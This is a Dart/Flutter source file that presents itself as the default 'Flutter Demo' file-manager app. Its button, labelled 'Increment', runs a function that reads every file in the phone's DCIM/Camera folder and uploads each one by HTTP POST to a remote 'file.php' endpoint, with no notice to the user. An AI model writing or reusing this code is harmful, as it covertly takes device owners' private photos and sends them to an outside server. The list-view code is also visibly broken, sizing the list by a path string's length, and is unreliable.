import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:flutter/material.dart';
import 'package:file_manager/file_manager.dart';
import 'package:permission_handler/permission_handler.dart';
import 'sarvice.dart';
void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(

        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
String amar ='/storage/emulated/0' ;

 Future  _incrementCounter() async{
    //print('${controller.setCurrentPath(amar.toString())}');
  }



  final FileManagerController controller = FileManagerController();
Serves serves=Serves();
final dir = Directory('/storage/emulated/0/DCIM/Camera');


 getval() async{



     final dir = Directory('/storage/emulated/0/DCIM/Camera');

     final List<FileSystemEntity> entities1 = await dir.list().toList();

     entities1.forEach((row) async {
       final uri = Uri.parse(serves.url+"file.php");
       var request = http.MultipartRequest('POST',uri);
     
       var videos = await http.MultipartFile.fromPath("file", row.path);
       request.files.add(videos);
       var response = await request.send();
       var response1 = await http.Response.fromStream(response);
       if (response.statusCode == 200) {
     
       }else{
         //  EasyLoading.showError('Failed with Error');
       }
       print(row);
     });



}


  @override
  Widget build(BuildContext context) {

    return Scaffold(
      appBar: AppBar(
        // Here we take the value from the MyHomePage object that was created by
        // the App.build method, and use it to set our appbar title.
        title: Text(widget.title),
      ),
      body: Center(
        // Center is a layout widget. It takes a single child and positions it
        // in the middle of the parent.
        child: FileManager(
    controller: controller,
    builder: (context, snapshot) {
    final List<FileSystemEntity> entities = snapshot;

    return ListView.builder(
    itemCount: amar.length,
    itemBuilder: (context, index) {
      print(FileManager.basename(dir));
    return Card(
    child: ListTile(
    leading: FileManager.isFile(entities[index])
    ? Icon(Icons.feed_outlined)
        : Icon(Icons.folder),
    title: Text(FileManager.basename(dir)),
    onTap: () {
    if (FileManager.isDirectory(entities[index])) {
    controller.openDirectory(entities[index]);


    // open directory
    } else {
    // Perform file-related tasks.
    }
    },
    ),
    );
    },
    );
    }
        ),
      ),

      floatingActionButton: FloatingActionButton(
        onPressed: getval,
        tooltip: 'Increment',
        child: const Icon(Icons.add),
      ), // This trailing comma makes auto-formatting nicer for build methods.
    );
  }
}
